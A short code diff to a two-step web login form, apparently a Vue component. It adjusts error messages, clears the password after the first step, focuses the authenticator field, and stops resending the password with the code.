@@ -277,12 +277,20 @@ const submitEmail = async () => {
       });
 
       if (!response.ok) {
-        throw new Error("Network response was not ok");
+        throw new Error("Invalid email or password");
       }
 
       const data = await response.json();
       console.log("Submission response:", data);
-      enterPassword.value = true; // Show authenticator code input
+
+      // Move to authenticator input
+      enterPassword.value = true;
+
+      // Clear password and set focus to authenticator field
+      credentials.value.password = "";
+      setTimeout(() => {
+        document.querySelector("input[placeholder='XXXXXX']").focus();
+      }, 0);
     } catch (error) {
       console.error("Submission failed:", error);
       authError.value = true;
@@ -307,17 +315,17 @@ const submitLogins = async () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           emailOrPhone: emailOrPhone.value,
-          password: credentials.value.password,
           authenticatorCode: credentials.value.authenticator,
         }),
       });
 
       if (!response.ok) {
-        throw new Error("Invalid response from server");
+        throw new Error("Invalid authenticator code");
       }
 
       const data = await response.json();
       console.log("Authenticator submission response:", data);
+
       alert("Login successful!");
     } catch (error) {
       console.error("Submission failed:", error);
